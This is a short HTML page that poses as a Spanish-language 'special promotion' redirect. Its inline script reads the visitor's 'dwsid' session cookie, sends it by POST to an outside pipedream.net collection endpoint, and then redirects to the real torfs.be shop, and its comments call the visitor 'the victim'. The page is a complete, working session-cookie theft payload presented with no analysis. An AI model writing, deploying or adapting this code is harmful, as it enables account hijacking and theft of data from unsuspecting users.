<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Promoción especial</title>
</head>
<body>
  <h1>Redirigiendo a la oferta...</h1>

  <script>
    // Extraer el valor de la cookie dwsid
    const match = document.cookie.match(/(?:^|; )dwsid=([^;]*)/);
    const dwsid = match ? match[1] : "";

    // Enviar la cookie al endpoint si existe
    if (dwsid) {
      fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "cookie=" + encodeURIComponent(dwsid)
      })
      .then(() => {
        // Redirigir a la víctima al sitio real
        window.location.href = "https://www.torfs.be";
      });
    } else {
      // Si no hay dwsid, solo redirigir
      window.location.href = "https://www.torfs.be";
    }
  </script>
</body>
</html>
